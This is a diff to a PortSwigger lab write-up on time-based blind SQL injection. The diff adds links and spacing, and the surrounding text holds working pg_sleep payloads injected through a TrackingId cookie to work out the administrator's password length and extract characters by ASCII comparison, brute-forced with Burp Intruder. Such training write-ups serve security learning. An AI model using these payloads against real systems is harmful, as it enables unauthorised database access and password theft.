@@ -1,7 +1,7 @@
 # Blind SQL injection-Time Based
 ## Summary
-- [Lab13: Blind SQL injection with time delays]()
-- [Lab14: Blind SQL injection with time delays and information retrieval]()
+- [Lab13: Blind SQL injection with time delays](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Time%20Based/Blind%20SQL%20injection-Time%20Based.md#lab13-blind-sql-injection-with-time-delays)
+- [Lab14: Blind SQL injection with time delays and information retrieval](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/Blind%20SQL%20injection/Blind%20SQLi%20-%20Time%20Based/Blind%20SQL%20injection-Time%20Based.md#lab14-blind-sql-injection-with-time-delays-and-information-retrieval)
 
 ### Lab13: Blind SQL injection with time delays
 - We will resort to the time delay in the server response if our techniques in conditional responses have failed.
@@ -39,14 +39,18 @@ TrackingId=xyz'||(select pg_sleep(10) from users)--
 
 ```
 TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
+
 TrackingId=xyz'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--
+
 TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator')--
 ```
 - Now we need to know the password length of the administrator.
 - You can use the intruder to brute force for the length and monitor the time of responses received.
 ```
 TrackingId=xyz'||(SELECT CASE WHEN (LENGTH(password)=20 AND username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+
 TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator')--
+
 TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND LENGTH(password)=20)--
 ```
 - Here, you will notice there is an over-in-time response of `10180 millis`, the delay has been succeeded with a payload of 20, so we have known that the password length is 20 char.
@@ -62,6 +66,7 @@ TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' 
 
 ```
 TrackingId=xyz'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND ASCII(SUBSTRING(password,1,1))=111)--
+
 TrackingId=xyz'||(SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))=111 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
 ```
 - But we need to try the ASCII numbers for each char so we will brute-forcing for 20 chars.
